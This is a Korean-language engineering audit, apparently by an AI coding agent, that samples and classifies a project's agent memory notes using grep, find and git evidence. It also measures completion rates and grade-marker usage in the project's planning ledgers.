- 전체 파일 크기 합계: **516,152 바이트**(약 504KB). 명령: `os.path.getsize` 합산(아래 스니펫 1).
- `MEMORY.md`: **159줄** · **12,449자**(UTF-8 17,149바이트). 명령: `wc -l MEMORY.md`, 파이썬 `len(open(...).read())`. 사실 카드 "12,308자" 대비 재측정: 12,449자 — 그 사이 항목이 갱신됐다(`ls -la` 바이트 수 17,308 vs 지금 17,149 도 근소한 차이, 세션 중 파일이 계속 갱신됨을 보여준다). 본문 항목 줄(`^- \[`)은 **153줄** — 헤더·섹션 제목 6줄 제외 정확히 1항목=1줄.

```python
# 스니펫 1: type/size/modified 집계
import glob, re, os
files = sorted([f for f in glob.glob('*.md') if f != 'MEMORY.md'])
type_count = {}; mod_after = 0; total_size = 0; no_modified = []
for f in files:
    txt = open(f, encoding='utf-8').read()
    total_size += os.path.getsize(f)
    m = re.search(r'^\s*type:\s*(\w+)', txt, re.MULTILINE)
    t = m.group(1) if m else 'UNKNOWN'
    type_count[t] = type_count.get(t, 0) + 1
    mm = re.search(r'^\s*modified:\s*([\d\-T:.Z]+)', txt, re.MULTILINE)
    if mm:
        if mm.group(1) >= '2026-08-03': mod_after += 1
    else:
        no_modified.append(f)
# 결과: {'feedback': 13, 'project': 138, 'reference': 2}, mod_after=74, total_size=516152, len(no_modified)=63
```

```python
# 스니펫 2: 파일시스템 mtime 대조(신뢰 불가 확인용)
import glob, os, datetime
files = [f for f in glob.glob('*.md') if f != 'MEMORY.md']
after = sum(1 for f in files if datetime.datetime.fromtimestamp(os.path.getmtime(f)) >= datetime.datetime(2026,8,3))
# 결과: 142 / 153 — frontmatter modified(74)와 크게 어긋남, mtime 축 폐기
```

### A.2 표본 30개 (재현 명령: `random.Random(20260909).sample(files, 30)`, `files = sorted(glob.glob('*.md'))` 에서 `MEMORY.md` 제외 후 정렬)

```
01 feedback_advisor_worker_split.md
02 feedback_ceo_multiagent_workflow_on_request.md
03 project_apps_script_sheet_cell_limit_silent_loss.md
04 project_as_visit_slot_is_per_order.md
05 project_claude_master_test_account.md
06 project_drawing_tablet_review_station.md
07 project_drawing_wizard_architecture.md
08 project_fragment_measure_needs_shell_header.md
09 project_ios_capture_optout.md
10 project_kakao_map_local_dev_domain_block.md
11 project_main_checkout_deploy_branch_diverged.md
12 project_mobile_nav_cohort_badge.md
13 project_mobile_queue_infinite_scroll.md
14 project_naver_width_size_option_ssot.md
15 project_notification_user_states_ssot.md
16 project_railway_redeploy_is_same_commit.md
17 project_ratelimit_failopen_redis_outage.md
18 project_rq_fork_inherits_parent_db_connection.md
19 project_save_button_focus_steal_click_loss.md
20 project_schedule_sync_column_first_date_only.md
21 project_share_contact_phone_vs_sender.md
22 project_spec_width_shipment_coupling.md
23 project_static_cache_policy.md
24 project_structured_notes_is_string_not_dict.md
25 project_symbol_relocation_contract_tests.md
26 project_system_review_prompt_set_2026_09.md
27 project_tail_spike_network_rca.md
28 project_template_macro_extraction_contract_gap.md
29 project_v3_shell_skips_surfaces_bundle.md
30 project_wdcalculator_mobile_pattern.md
```

재현 검증: 위 30개 파일명으로 `python3 -c "import glob,random; files=sorted([f for f in glob.glob('*.md') if f!='MEMORY.md']); print(len(files)); print(sorted(random.Random(20260909).sample(files,30)))"` 를 메모리 디렉토리에서 그대로 실행하면 동일 30개가 나온다(153개 모집단 확인 포함).

### A.3 표본별 판정표

열: `ID | 파일명 | type | 갈래 | 근거 | 판정 | 복원 트리거`

`feedback`/`user` type 은 규칙대로 갈래와 무관하게 판정 = **KEEP-PREF**(갈래는 참고용으로만 기재).

| ID | 파일명 | type | 갈래 | 근거(경로:행 · 명령 · git log) | 판정 | 복원 트리거 |
|---|---|---|---|---|---|---|
| M-01 | feedback_advisor_worker_split.md | feedback | ③(전역 `~/.claude/CLAUDE.md` §1~§3 내용 그대로 요약 — 리포 밖 파일이라 저장소로 유도 불가) | `~/.claude/CLAUDE.md` 존재 확인: `ls "C:/Users/USER/.claude/CLAUDE.md"` → 존재. 리포 안에는 이 개정 이력이 없음(리포 밖 정책 파일의 사본) | **KEEP-PREF**(type=feedback) | — |
| M-02 | feedback_ceo_multiagent_workflow_on_request.md | feedback | ①(같은 레시피가 `docs/plans/2026-09-06-foms-system-review-*` 5파일 + 다수 `*-multiagent-ledger.md` 에 반복 실증됨) | `ls docs/plans/2026-09-06-foms-system-review-*` → prompt·brief·ledger·report·report-ledger·workflow.js 6개 확인, `git log --oneline -1 062723348` → 실커밋 | **KEEP-PREF**(type=feedback) | — |
| M-03 | project_apps_script_sheet_cell_limit_silent_loss.md | project | ③(②) — FOMS 리포 밖 Google Apps Script(`.gs`, `C:\Users\USER\.cursor\...\channeltalk-sheet-webhook-20260903.gs`) 사고 기록, 해결된 1회성 사고 | 존재 확인: `find . -iname "*channeltalk-sheet-webhook*"` (FOMS 리포 내 0건) — 대상 시스템 자체가 이 리포 밖. `docs/harness` 어디에도 이 웹훅 코드 없음 | **KEEP-FACT**(단, 애매 — FOMS 리포 범위 밖 시스템 자체를 다룸, 아래 3-1 참고) | — |
| M-04 | project_as_visit_slot_is_per_order.md | project | ①(`register_as_cycle`/`_apply_visit_projection`/`_apply_reregistration` 전부 실재, 커밋 실재) | `foms/services/orders/as_cycle_service.py:480` `_apply_visit_projection(sd, order, None, None)` 확인, `foms/api/cs/as_orders.py:708` `_apply_reregistration` 확인, `git cat-file -t 0d71db72` → commit | DELETE | AS 재접수 시 새 건이 직전 건 방문일을 물려받는 회귀가 다시 보이면(`test_state_as.py`/`test_as_billing.py` red) 복원 |
| M-05 | project_claude_master_test_account.md | project | ③(운영 DB 계정 상태·로컬 secrets 파일 경로 — 저장소로 유도 불가) | `docs/guides/REAL_SERVER_TEST_ACCOUNT.md` 는 정책 포인터만 있고 계정 id(58/57)·비밀번호 파일 경로는 리포에 없음(secrets 는 로컬 전용, 커밋 금지가 정책) | KEEP-FACT | — |
| M-06 | project_drawing_tablet_review_station.md | project | ①(②) — 스펙·권한식 실재하나 줄번호 드리프트, 배포 이력은 완료된 과거 상태 | `docs/specs/2026-07-27-drawing-tablet-review-station-design.md` 존재. 권한식은 실재하나 위치 이동: 메모리 인용 `workbench.py:717` → 실제 `foms/web/drawing/workbench.py:477`(`can_review_perm = bool(is_admin or (can_sales and not is_drawing_team))`), `foms/api/drawing/erp_orders_revision.py:306` 도 동일 조건 | DELETE | `not is_drawing_team` 조건이 신규 표면에서 빠져 도면팀에게 수정요청 버튼이 다시 노출되면 복원 |
| M-07 | project_drawing_wizard_architecture.md | project | ①(스펙·코드 경로 전부 실재) | `docs/specs/2026-07-06-drawing-wizard_SPEC.md`, `docs/specs/2026-07-06-drawing-wizard-v2_SPEC.md`, `foms/web/drawing/wizard.py`, `foms/api/drawing/wizard.py` 전부 `find`/`ls` 로 확인 | DELETE | asset-raw 프록시를 우회해 R2 presigned URL 을 직접 참조하는 회귀가 나오면(html2canvas 내보내기 이미지 누락) 복원 |
| M-08 | project_fragment_measure_needs_shell_header.md | project | ①(②) — 헤더 상수는 코드에 실재, 2026-08-11 실측 바이트 수치는 그 시점 스냅샷 | `foms/services/common/erp_navigation_contract.py:86` `ERP_SHELL_REQUEST_HEADER: str = "X-FOMS-ERP-SHELL"` 확인 | DELETE | 프래그먼트 크기를 손측정하며 이 헤더를 빼먹어 잘못된 결론(예: "탭마다 85KB 재전송")이 다시 보고되면 복원 |
| M-09 | project_ios_capture_optout.md | project | ①(파일·테스트 전부 실재) | `static/js/foms/photo-capture.js`, `tests/domains/test_photo_capture.py` 둘 다 `find` 로 확인 | DELETE | iOS 신규 업로드 input 이 `data-foms-no-capture` 없이 추가돼 카메라 강제가 재발하면(`test_photo_capture.py` red) 복원 |
| M-10 | project_kakao_map_local_dev_domain_block.md | project | ③(Kakao Developers 콘솔의 도메인 등록 상태 — 외부 SaaS 설정, 리포로 유도 불가) | `foms/services/common/geocode_config.py:32` `KAKAO_JS_API_KEY` 상수 자체는 리포에 있으나, 그 키가 어느 도메인에 등록됐는지는 카카오 콘솔에만 있음(리포 미포함) | KEEP-FACT | — |
| M-11 | project_main_checkout_deploy_branch_diverged.md | project | ③(세션마다 로컬 git 상태를 재라는 워크플로 습관 — 코드로 강제되지 않음) | `grep -rln "rev-list --left-right --count" AGENTS.md CLAUDE.md docs/guides/*.md` → 0건, `session_start.py` 훅에도 이 체크 없음(`grep -n "rev-list" .claude/hooks/session_start.py` → 0건) — 문서·훅 어디에도 이 습관이 코드화돼 있지 않음, 저장소가 강제하지 않는 진짜 비유도 사실 | KEEP-FACT | — |
| M-12 | project_mobile_nav_cohort_badge.md | project | ①(전부 실재) | `foms/services/dashboard_counts.py:26` `NAV_STATUS_BUCKETS`, `:56` `MINE_ONLY_TEAMS`, `foms/services/erp_permissions.py:223` `def build_mine_sql_filter` 전부 확인 | DELETE | 신규 팀을 mine-only 로 추가하면서 manager_name 매칭 여부를 확인 안 해 담당자 큐가 누락되는 회귀가 재발하면 복원 |
| M-13 | project_mobile_queue_infinite_scroll.md | project | ①(②) — 배선 실재, 본문 대부분은 완료된 마이그레이션 이력(최종 결정문이 맨 위에 있어 나머지는 참고 이력) | `templates/partials/shared/mobile_queue_pager.html`, `static/js/foms/mobile-queue-scroll.js` 확인, `tests/contracts/runtime/foms_namespace_surface_tests.py:2469` `_PAC_PARTIALS_SHARED_HTML_ALLOWLIST` 확인 | DELETE | 신규 `partials/shared/` html 을 allowlist 등재 없이 추가해 계약 테스트가 red 나면 복원 |
| M-14 | project_naver_width_size_option_ssot.md | project | ① | `foms/services/integrations/naver_commerce/dock.py:175` `def size_option_mm`, `:213` `def _width_unit_mm` 확인 | DELETE | 네이버 도크 총폭이 상품명 기준으로 되돌아가 900mm 급 오차가 재발하면(2026090191203001 류 사고) 복원 |
| M-15 | project_notification_user_states_ssot.md | project | ①(SW 캐시 버전 `foms-p2-v10` 을 포함해 전부 현재 값과 정확히 일치) | `foms/services/notifications/recipients.py:141` `def fan_out_new_notification` 확인, `static/sw.js:27` `var CACHE_VERSION = "foms-p2-v10";` — 메모리가 "2026-09-06 현재 foms-p2-v10" 이라 적었고 지금도 그대로(계약 테스트 exact pin 이 값을 붙들고 있다는 방증) | DELETE | 신규 알림 생성 지점에서 `fan_out_new_notification` 호출을 빼먹어 그 알림이 list/badge 에 안 보이면 복원 |
| M-16 | project_railway_redeploy_is_same_commit.md | project | ③(Railway CLI/GraphQL 동작 방식 — 외부 PaaS 행동, 리포로 유도 불가) | Railway `redeploy` 커맨드 동작은 리포 코드가 아니라 Railway 서비스 자체의 동작 — `grep -rn "serviceInstanceDeploy" .` → 0건(리포에 이 사실을 코드화한 곳 없음) | KEEP-FACT | — |
| M-17 | project_ratelimit_failopen_redis_outage.md | project | ① | `foms/services/rate_limit.py:18` `def init_limiter`, `:69-70` `swallow_errors=True`/`in_memory_fallback_enabled=True` 확인. `git cat-file -t 8728d45d` / `git cat-file -t 4c026ca5` → 둘 다 commit 실재 | DELETE | `swallow_errors`/`in_memory_fallback_enabled` 가 리팩터로 빠져 Redis 장애 시 500 이 재현되면(`test_dead_redis_does_not_500_and_falls_back` red) 복원 |
| M-18 | project_rq_fork_inherits_parent_db_connection.md | project | ②(핵심 식별자가 오늘(2026-09-09) 리팩터로 사라짐) | tools/ops/run_rq_worker.py(삭제됨) — `find . -iname "run_rq_worker.py"` → 0건(존재 안 함). `HeartbeatWorker`/`main_work_horse` — `grep -rln -i "heartbeatworker" --include=*.py .` → 0건. `engine.dispose(close=False)` — `grep -rn "dispose(close=False)" --include=*.py .` → 0건(현재는 bare `.dispose()` 만 14곳). tests/domains/test_loop_heartbeat_wiring.py(삭제됨) 는 `find` 로 부재 확인, `git log --oneline -- "*test_loop_heartbeat_wiring*"` 로 대조하면 커밋 `61a2de3ac`(오늘, `test(ops): 워커 배선 테스트를 쪼개고 smoke 에 등재한다`)에서 `test_worker_loop_heartbeat.py`/`test_order_sync_cadence.py`/`test_worker_sentry_wiring.py` 3벌로 분할·삭제됨이 diffstat 로 확인됨. 실제 워커 기동은 이제 `start.sh`(`rq worker default --url "$REDIS_URL" &`, 2026-09-08 운영 사고 수정 주석)가 감시 루프로 직접 띄운다 — `run_rq_worker.py` 커스텀 엔트리포인트 자체가 폐기됨 | DELETE | 60초 이상 도는 rq 잡이 부모와 DB 소켓을 공유해 `SSL SYSCALL error: EOF detected` 로 죽는 증상이 재현되면(현재 아키텍처 `start.sh` 인라인 `rq worker` 기준으로) 복원 — 단 원문의 파일·클래스명은 전부 갱신 필요 |
| M-19 | project_save_button_focus_steal_click_loss.md | project | ① | `static/js/orders/erp-order-shared.js:3162` `document.getElementById('erp-save-btn')?.addEventListener('pointerdown', ...)` 확인(메모리는 `erp-order-shared.js` 라고만 적어 경로 `static/js/foms/` 로 착각하기 쉬움 — 실제는 `static/js/orders/`), `tests/domains/test_erp_order_shared_form_scripts.py:1756` `def test_save_button_does_not_steal_focus_on_mouse_pointerdown` 확인 | DELETE | 저장 버튼 pointerdown 가드가 리팩터로 빠지고 "첫 클릭 무산 + 스크롤" 증상이 재현되면 복원 |
| M-20 | project_schedule_sync_column_first_date_only.md | project | ① | `foms/services/orders/dashboard_control_tower.py:59` `def _sched_any`, `:85` `def _measure_on` 확인. `git cat-file -t e60e22c9` → commit 실재(`fix: 모바일 홈 타워 실측/시공 카운트 복수 일정 대응 — order_schedule_dates SSOT`) | DELETE | `dashboard_read_model.py` 의 alert D-day KPI 가 여전히 싱크 컬럼 기반이라 적힌 "잔여 미수정" 항목이 실제로 고쳐지면(반대 방향 갱신 트리거) 복원 검토 |
| M-21 | project_share_contact_phone_vs_sender.md | project | ① | `foms/api/share.py:1062` `def _resolve_sender`, `:1342` `def _share_contact_phone` 확인 | DELETE | `users.sender_phone` 이 실제로 채워지기 시작하거나 체인 순서가 바뀌면(공유 링크 발신번호 오배선) 복원 |
| M-22 | project_spec_width_shipment_coupling.md | project | ① | `foms/services/erp_template_filters.py:67` `def eval_spec_width_mm`, `:179` `def item_spec_w300_value` 확인. `_get_order_spec_units` 는 메모리가 `foms/web/shipment/dashboard.py` 소속이라 적었으나 실제로는 `foms/services/shipment_dashboard_helpers.py:218` 로 이동(같은 이름 유지, `foms/web/shipment/dashboard.py:22`에서 import) — 경로 드리프트 1건 | DELETE | 시공비 계산 탭 신설 시 `eval_spec_width_mm` 재사용 없이 W 를 직접 파싱해 출고 값과 어긋나면 복원 |
| M-23 | project_static_cache_policy.md | project | ① | `foms/platform/app_factory.py:13` `from whitenoise import WhiteNoise`, `:45` `def _add_static_response_headers` 확인 | DELETE | CSS/JS 에 1년 immutable 캐시가 다시 붙어 "배포해도 화면이 안 바뀐다" 증상이 재발하면 복원 |
| M-24 | project_structured_notes_is_string_not_dict.md | project | ① | `templates/measurement/partials/dashboard_main.html:959` `{%- set rsd_notes = rsd_notes_raw if rsd_notes_raw is mapping else {} %}` 확인(`is mapping` 가드 실재) | DELETE | `.get()` 가드 없이 `sd['notes']` 를 dict 로 직접 `.get()` 하는 신규 템플릿이 추가돼 문자열 notes 를 가진 구주문에서 500 이 재현되면 복원 |
| M-25 | project_symbol_relocation_contract_tests.md | feedback | ①(테스트 파일 전부 실재) | `tests/contracts/runtime/foms_namespace_surface_tests.py`, `tests/domains/test_erp_permissions.py`, `tests/domains/test_erp_dashboard_active_filter.py` 전부 `find` 로 확인 | **KEEP-PREF**(type=feedback, 파일명은 `project_` 접두이나 frontmatter `type: feedback`) | — |
| M-26 | project_system_review_prompt_set_2026_09.md | reference | ①(가리키는 파일 6개 전부 실재) | `ls docs/plans/2026-09-06-foms-system-review-*` → brief·ledger·prompt·report·report-ledger·workflow.js 6개 확인. `git cat-file -t 062723348` → commit 실재 | DELETE(포인터일 뿐 — 파일이 실재하므로 재검색 가능) | 같은 프롬프트 세트 위치를 다시 찾지 못해 세션이 헤매면 복원(또는 `docs/plans/` 파일명 규칙 문서화로 대체) |
| M-27 | project_tail_spike_network_rca.md | project | ③(①) — 핵심 결론(한국↔싱가포르 네트워크 경로)은 Railway 리전 구성이라는 외부 인프라 사실, 저장소로 유도 불가. 롤백 불가 판단 근거(27개 파일 의존)는 코드로 확인 가능 | Railway 아시아 리전이 싱가포르 단일이라는 사실은 Railway 대시보드/API 조회 결과이지 리포 안에 없음(`grep -rln "asia-southeast1" .` → 0건). read-model 의존 27개 파일 주장은 `grep -rl "dashboard_cache" foms/` 로 개수 재확인 가능(별도 카운트 필요, 이 감사 범위 밖) | KEEP-FACT | — |
| M-28 | project_template_macro_extraction_contract_gap.md | project | ① | `tests/domains/test_tablet_t2_contract.py` 존재 확인(`find`) | DELETE | 템플릿 매크로 추출 변경을 `pre_push_smoke` 서브셋만 돌리고 push 해 CI 가 UndefinedError/소스 리터럴 계약으로 red 나면 복원 |
| M-29 | project_v3_shell_skips_surfaces_bundle.md | project | ① | `templates/partials/shared/layout_head.html:206` `foms-mobile-surfaces.css`(v2 계열), `:229` `foms-mobile-v3.css`(v3 전용) — 두 자산이 분리 로드됨을 확인 | DELETE | v3 셸 화면에서 공용 KV/제품항목 컴포넌트 CSS(`.foms-kv-row` 등)가 실화면에서 `display:block`/보더 0 으로 다시 관측되면 복원 |
| M-30 | project_wdcalculator_mobile_pattern.md | project | ① | `static/js/wdcalculator/mobile-enhance.js`, `static/js/wdcalculator/product-settings-mobile.js`, `docs/design/mockups/mobile-wdcalculator*.html`(3개) 전부 `find` 로 확인 | DELETE | WDCalculator 계열 신규 페이지 모바일화에서 이 additive 패턴(호스트 마크업 무변경)이 깨져 CRUD 로직이 중복 구현되면 복원 |

### A.4 비율과 외삽

- 갈래 분포(표본 30, 판정 기준): **① 20 / ② 1 / ③ 7 / feedback-override 3**(M-01·M-02·M-25 는 갈래를 기재했지만 판정은 type 우선으로 KEEP-PREF).
- 판정 분포: **DELETE 21건(70.0%, 20 = ① 20건 전량 + ② 1건) · KEEP-FACT 6건(20.0%, ③ 7건 중 M-03 은 KEEP-FACT 로 판정했지만 리포 밖 시스템이라 3-1 에서 별도 논의, M-27 은 KEEP-FACT) · KEEP-PREF 3건(10.0%, feedback type M-01·M-02·M-25)**.
  - 확인: 21 + 6 + 3 = 30.
- 명령: 위 표의 개별 grep/find/git 명령 전부(행마다 병기) + 카운트는 수작업 집계(자동 집계 스크립트 없음 — 30건은 사람이 각각 확인해야 하는 판정이라 표 자체가 명령이다).
- **외삽**: 표본 KEEP 비율(KEEP-FACT + KEEP-PREF) = 9/30 = **30.0%**. 전체 153개에 그대로 적용하면 잔존(KEEP) 예상 개수 = 153 × 0.30 ≈ **46개**. DELETE 예상 개수 = 153 × 0.70 ≈ **107개**.
  - 주의: 표본이 project 26·feedback 3·reference 1 로 모집단 비율(project 138/153=90.2%, feedback 13/153=8.5%, reference 2/153=1.3%)과 project 비중이 약간 낮다(86.7% vs 90.2%) — feedback 은 항상 KEEP-PREF 라 표본의 feedback 비중이 조금만 높아도 KEEP 비율이 위로 쏠린다. 즉 46개는 다소 낙관적(상한에 가까운) 추정치로 본다.

### A.5 MEMORY.md 줄 수 상한 제안 (L6 항목화)

- 현재: `MEMORY.md` 159줄(항목 153줄 + 헤더 6줄), 12,449자 — 세션마다 통째로 로드된다(§2.1).
- 외삽 잔존 항목 46개 기준 제안 상한: **60줄**(항목 46 + 헤더 6 + 여유 8). 근거: A.4 외삽(항목 30% 잔존) + 현재 항목당 평균 1줄(153항목/153줄, 스니펫 1 확인) 비율을 그대로 적용.
- 판정: L6, 조건부 COMPRESS 후보 — 상한 자체를 코드 가드로 걸 것을 제안(`9.3 초안`의 `tests_harness_drift_guard.py.proposed` 소관, 이 워커 범위 밖).

### 3-1. 애매한 판정 메모 (표 밖 보충)

- **M-03**(apps script 사고): 대상 시스템(`.gs` 웹훅)이 FOMS git 리포 밖(`.cursor` 프로젝트)이라 "저장소에서 유도 가능"의 반대말인 "비유도"에는 들어맞지만, 애초에 이 메모리가 FOMS 프로젝트 범위 질문인지 자체가 애매하다. 갈래 판정 규칙이 "이 리포 안에 있는가/없는가" 이지 "이 프로젝트 범위인가" 가 아니라서 기계적으로는 ③=KEEP-FACT 이 나오지만, 실질은 완전히 다른 코드베이스의 1회성 사고 기록이라 KEEP-FACT 보다는 DELETE(범위 밖) 에 더 가깝다고 본다. 판정 보류 후보로 표시.
- **M-18**(rq fork): 오늘 자 커밋(`61a2de3ac`)으로 참조 파일·클래스명이 실제로 사라진 것을 확인한 사례 — "유효 기간 지남"의 교과서적 사례이자, 동시에 "지금 안 보인다"가 "아까도 없었다"를 뜻하지 않는다는 반증 확인이 필요했던 사례(CLAUDE.md Occam 원칙과 정면으로 맞아떨어짐). git log 로 삭제 커밋까지 확인했으므로 확신 높음.
- **M-26**(system review prompt set, type=reference): reference 타입은 feedback/user 처럼 예외 규칙이 없어 갈래(①)를 그대로 따라 DELETE 로 판정했지만, 이런 "산출물 지도" 성격 메모는 검색 비용 대비 유지 비용이 낮아 KEEP 쪽 재량 여지가 있다 — 애매 판정으로 별도 표시.

---

## B. `docs/plans` 완주율 (C-01 ~)

### B.1 유형별 개수 (2026-08-03 이후, 명령: `ls docs/plans | grep -E "2026-0(8-(0[3-9]|[1-3])|9)"`)

| 유형(파일명 패턴) | 개수 | 판정 규칙 |
|---|---|---|
| 전체(디렉토리 항목 수) | **104** | `ls docs/plans \| grep -E "2026-0(8-(0[3-9]\|[1-3])\|9)" \| wc -l` → 104(메타 프롬프트 예시치 "103" 대비 재측정 — 오늘 신규 파일 `2026-09-09-*` 포함돼 1건 증가) |
| ledger(`*ledger*.md`) | **58** | `... \| grep -i ledger \| wc -l` → 58 |
| plan(`*-plan.md`) | **12** | `... \| grep -iE "\-plan\.md$" \| wc -l` → 12 |
| brief(`*brief*.md`) | **10** | `... \| grep -i brief \| wc -l` → 10 |
| prompt(`*prompt*.md`) | **9** | `... \| grep -i prompt \| wc -l` → 9 |
| report(파일명에 `report` 포함, ledger 중복 제외) | **2**(`2026-09-06-foms-system-review-report.md`, `2026-09-05-settlement-cfo-review-report.md`) — `*report-ledger.md` 는 ledger 로 선분류 | `... \| grep -i report \| grep -vi ledger \| wc -l` → 2 |
| spec | **0**(이 폴더에 `_SPEC`/`spec` 이름 파일 없음 — 스펙은 `docs/specs/`에 별도 위치) | `... \| grep -iE "spec"` → 0건 |
| 기타(위 어디에도 안 걸림, 디렉토리 1개 포함) | **13**(그중 1개는 파일이 아니라 워크플로 산출물 **디렉토리** `2026-09-05-settlement-cfo-review/`) | 목록: `2026-08-07-audit-retention-analysis.md`·`2026-08-08-external-writer-triage.md`·`2026-08-13-order-change-retention-measurement.md`·`2026-08-24-naver-production-promotion-blockers.md`·`2026-08-25-naver-full-promotion-roadmap.md`·`2026-08-25-naver-repay-reconcile-next-session.md`(prompt 미포함 어휘)·`2026-08-28-structured-source-dual-meaning-followup.md`·`2026-08-30-naver-history-status-contract.md`·`2026-08-31-naver-bulk-dispatch-result-ui.md`·`2026-09-02-naver-settlement-contracts.md`·`2026-09-02-naver-settlement-v1.1-contracts.md`·`2026-09-05-settlement-cfo-review`(디렉토리, 하위 `ceo_plan.md`+`critic.md`+`findings_w1~4.md`+`verify_w1~4.md` 10개는 Workflow 도구 산출물이라 상위 104 카운트에 안 잡힘)·`2026-09-06-foms-system-review-workflow.js` |
| 합계 확인 | 58+12+10+9+2+0+13 = **104** | 일치 |

### B.2 ledger 58개 마지막 상태 집계

판정 방식: 각 파일 전체 텍스트에서 `\bDONE\b`/`\bPENDING\b`/`\bBLOCKED\b`(대문자 영문 마커) 개수를 세고, BLOCKED>0 이면 "BLOCKED 있음", 아니면 PENDING>0(또는 IN-PROGRESS)이면 "일부 PENDING", 아니면 DONE>0 이면 "전 task DONE". 영문 마커가 0건인 4개 파일은 본문을 직접 읽어 한글 상태어(완료/남은 것/보류/미확인/미해결)로 재판정했다(아래 표에 표시).

| 상태 | 개수 | 비고 |
|---|---|---|
| 전 task DONE | **30** | 영문 마커 기준 28 + 한글 재판정 2건(`2026-08-28-naver-repay-origin-cancel-ledger.md`: "상태: **완료 — 운영 반영**", T1~T10 전량 구현·운영 승격 완료 / `2026-09-06-foms-system-review-report-ledger.md`: 표 9행 전부 "완료") |
| 일부 PENDING | **15** | 영문 마커 기준 13 + 한글 재판정 2건(`2026-08-24-naver-d1-repay-revision-ledger.md`: "남은 것 — 코드 전량 승격은 전용 세션, 스테이징 육안 확인 필요" / `2026-08-24-naver-workbench-ux-pass-ledger.md`: "남은 것 — 육안 미확인, `docs/AI_STATUS.md` 미갱신, 케이스1 은 사용자 지시로 보류·위험 1건 미해결") |
| BLOCKED 있음 | **13** | 영문 마커 `BLOCKED` 1회 이상 |
| 상태 표기 없음 | **0** | 최초 자동집계 4건 전부 한글 상태어로 재판정 완료(위 두 행에 흡수) |
| 합계 | **58** | 30+15+13+0 |

**완주율 = 전 task DONE ÷ ledger 수 = 30 / 58 = 51.7%.**

명령(자동집계 1차, 한글 재판정 전 원시 수치 포함):
```python
import re, subprocess
names = subprocess.run(['bash','-c',
  'ls docs/plans | grep -E "2026-0(8-(0[3-9]|[1-3])|9)" | grep -i ledger'],
  capture_output=True, text=True).stdout.strip().split('\n')
for name in names:
    txt = open('docs/plans/'+name, encoding='utf-8').read()
    done = len(re.findall(r'\bDONE\b', txt))
    pending = len(re.findall(r'\bPENDING\b', txt))
    blocked = len(re.findall(r'\bBLOCKED\b', txt))
# 1차 결과: 전DONE 28 · BLOCKED있음 13 · 일부PENDING 13 · 상태없음 4
# 상태없음 4건 수동 확인 후 전DONE +2, 일부PENDING +2 로 재분류(위 표)
```
한글 상태어 확인 명령(4건): `grep -n "완료\|미완료\|보류\|미해결\|남은 것" "docs/plans/<file>"`.

### B.3 plan 파일 중 짝 ledger 없는 것

12개 plan 중 **2개**가 짝 ledger 없음(파일명에서 `-plan.md` → `-ledger.md` 로 치환해 존재 확인):

1. `2026-08-08-audit-carryover-plan.md` — 별도 ledger 없이 **plan 파일 안에 자체 진행 상태 표**를 둠(C1·C2·C3-a·C3-b DONE, **C3-c 패킷 전환은 "미착수"** — 완주 아님).
2. `2026-09-04-as-legacy-stage-cleanup-plan.md` — `git status --porcelain` 상 `??`(untracked, 이번 세션 시작 시점 git 상태 스냅샷에서도 확인됨) — 본문 "상태: **설계 승인 대기**"(운영 DB 쓰기는 승인 후에만) → 실행 전 단계라 ledger 가 아직 없는 것이 정상.

명령: 아래 bash 루프(각 `-plan.md` 를 `-ledger.md` 로 치환해 `-f` 존재 확인).
```bash
for p in $(ls docs/plans | grep -E "2026-0(8-(0[3-9]|[1-3])|9)" | grep -iE "\-plan\.md$"); do
  ledger="docs/plans/$(echo "$p" | sed 's/-plan\.md$/-ledger.md/')"
  [ -f "$ledger" ] || echo "$p -> NO MATCHING ledger"
done
# 결과: 2026-08-08-audit-carryover-plan.md, 2026-09-04-as-legacy-stage-cleanup-plan.md
```

### B.4 등급 마커(`**A`~`**D`) 사용 흔적

- 명령 1: `git log --since=2026-08-03 --format=%B | grep -cE "\*\*[A-D]"` → **7**.
- 명령 2: `grep -rlE "^\*\*[A-D]" docs/plans | wc -l` → **71개 파일**(주의: 이 grep 은 날짜 필터 없이 `docs/plans/` 전체 — 2026-03~04월대 리팩터 배치 문서가 다수 섞여 있다. 2026-08-03 이후 104개 범위로 좁히면 **27개 파일**, 총 매치 라인 수 **53줄**).
- **원시 정규식은 과대측정이다** — 직접 라인 단위로 읽어 확인한 결과, 27개 파일·53줄 중 실제 세션 등급 마커("`**A/B/C/D` + 공백 + 작업 설명"으로 CLAUDE.md 등급 프로토콜과 일치하는 용법)는 **9줄**뿐이고, 나머지 44줄은 전부 오탐(굵게 강조한 단어가 우연히 A~D 로 시작 — 예: `**CI**:`, `**CEO 가...`, `**AS 전용...`, `**B-1 은...`, `**D1 자리...`(발견 항목 ID), `**CRIT-A-01`(리뷰 발견 ID)). 진짜 마커 9건은 전부 `*-next-session-prompt.md`(6건: 08-23·08-24·08-24(v3)·08-25·08-27·08-28) + `2026-09-06-foms-system-review-prompt.md`(**A) + `2026-09-09-harness-ablation-v2-meta-prompt.md`(**B, 이 지시서 자체) + `2026-08-25-naver-repay-reconcile-next-session.md`(**C) — 즉 **세션 인계 프롬프트(`*-next-session-prompt.md`/`*-meta-prompt.md`) 파일군에서만 신뢰 가능하게 쓰인다.**
- 명령(오탐 제외 확인): `grep -nE "^\*\*[A-D]" docs/plans/<file>` 를 27개 파일 각각에 실행해 수작업 대조(예: `docs/plans/2026-08-23-naver-next-session-prompt.md:7` `**C 네이버 워크벤치 — 취소 실호출 확인 + 운영 승격.` = 진짜 / `docs/plans/2026-08-26-audit-gap-fill-ledger.md:175` `**CI**: ...` = 오탐).
- git log 7건도 동일 확인: 진짜 마커 참조 3건(`docs: 감사 로깅 스펙 2차 개정 — **D CEO 리뷰+3-agent 교차검수 반영`, `docs: 시스템 전체 감사 로깅 스펙·플랜·원장 (**C, 승인 대기)`, `docs: 출고 시공일 변경 알림 스펙·플랜·원장 (**C)`), 오탐 4건(`**AS 주문을...`, `**API 존재...`, `**AS 데스크톱 표...` 중복 2회).

### B.5 판정

- 완주율 51.7%(30/58) **< 70%** 기준선 미달.
- 마커 사용 흔적은 **실재하되 좁게 국한**된다 — `*-next-session-prompt.md`/`*-meta-prompt.md` 계열 파일 9곳(git 커밋 메시지 3곳 포함)에서만 신뢰 가능한 용법이 나오고, ledger·brief 본문에서의 매치는 거의 다 오탐(굵은 강조가 우연히 A~D 로 시작).
- 규칙(§9.1 지시서 인용): "완주율이 70% 이상이고 마커 사용 흔적이 있으면 L3(사용자 취향) KEEP-PREF 후보, 아니면 L4 로 두고 근거와 함께 COMPRESS/DELETE 후보." → **완주율 미달(51.7% < 70%)이므로 L4, COMPRESS/DELETE 후보.**
